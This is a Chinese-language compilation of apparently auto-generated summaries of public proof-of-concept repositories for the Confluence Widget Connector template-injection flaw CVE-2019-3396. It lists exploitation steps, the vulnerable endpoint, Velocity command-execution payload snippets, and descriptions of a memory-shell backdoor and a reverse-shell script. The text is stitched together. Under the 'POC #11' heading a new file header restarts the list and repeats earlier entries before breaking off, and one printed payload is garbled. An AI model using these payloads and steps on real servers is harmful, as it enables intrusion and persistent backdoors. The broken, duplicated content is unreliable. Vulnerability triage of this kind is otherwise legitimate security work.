**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
